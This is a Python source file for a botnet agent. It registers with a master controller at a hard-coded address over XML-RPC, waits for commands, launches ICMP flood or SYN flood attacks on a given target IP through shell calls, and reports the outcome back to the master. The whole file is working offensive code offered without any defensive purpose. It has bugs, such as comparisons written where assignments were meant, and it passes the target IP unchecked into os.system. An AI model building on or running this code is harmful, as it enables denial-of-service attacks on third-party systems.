import signal
import os
import sys
import socket
import platform
import xmlrpc.client
from xmlrpc.server import SimpleXMLRPCServer, SimpleXMLRPCRequestHandler
from socketserver import ThreadingMixIn

try:
    import scapy
except:
    os.system("pip install scapy")


def getIpAddress():
    return socket.gethostbyname(socket.gethostname())


class SimpleThreadXMLRPCServer(ThreadingMixIn, SimpleXMLRPCServer):
    pass


class RequestHandler(SimpleXMLRPCRequestHandler):
    rpc_paths = ("/RPC2",)


class BotNet:
    def __init__(self, ip_master):
        self.ip_master = ip_master
        self.isAttack = False
        self.client = xmlrpc.client.ServerProxy("http://"+ip_master+":8000")
        self.server = SimpleThreadXMLRPCServer((getIpAddress(), 5000),
                                               requestHandler=RequestHandler,
                                               logRequests=False,
                                               allow_none=True,
                                               )

    def listenMaster(self):
        self.server.register_introspection_functions()
        # self.server.register_function(self.attackTarget, "attack_target")
        self.server.register_function(self.receiveCommand, "give_command")
        self.server.serve_forever()

    def stopAttack(self):
        self.client.unregister_ip(ip_address)
        os.kill(os.getpid(), signal.CTRL_C_EVENT)

    def receiveCommand(self, message):
        """receive command from master"""
        if message["type"] == "attack":
            if self.isAttack == False:
                self.isAttack == True
                self.attackTarget(message)
            else:
                print("You already attack an target!")
        elif message["type"] == "stop":
            self.stopAttack()

    def get_platform(self):
        """get botnet system platform"""
        return platform.system()

    def attackTarget(self, message):
        response = 0
        if (self.get_platform().lower() == "linux"):
            if message["attack_type"] == "icmp":
                os.system("ping "+message["target_ip"] + " -s 65500")
            elif message["attack_type"] == "syn":
                os.system("python syn_attack.py " +
                          message["target_ip"] + 80 + str(message["number_of_attack"]))
        elif (self.get_platform().lower() == "windows"):
            if message["attack_type"] == "icmp":
                response = os.system("ping "+message["target_ip"] +
                                     " -l 65500 -n " + str(message["number_of_attack"]))
            elif message["attack_type"] == "syn":
                os.system("python syn_attack.py " +
                          message["target_ip"] + " " + str(80) + " " + str(message["number_of_attack"]))
        self.isAttack == False

        if response == 0:
            response = "success"
        else:
            response = "failed"

        self.informMaster(message["target_ip"],
                          response, message["attack_type"])

    def informMaster(self, target, status, attack_type):
        self.client.inform_master(getIpAddress(), target, status, attack_type)


if __name__ == '__main__':
    botnet = BotNet(ip_master="192.168.1.16")
    print(botnet.client.system.listMethods())
    ip_address = getIpAddress()
    botnet.client.register_ip(ip_address)
    try:
        botnet.listenMaster()
    except KeyboardInterrupt:
        botnet.client.unregister_ip(ip_address)
        os.system("python main_botnet.py")
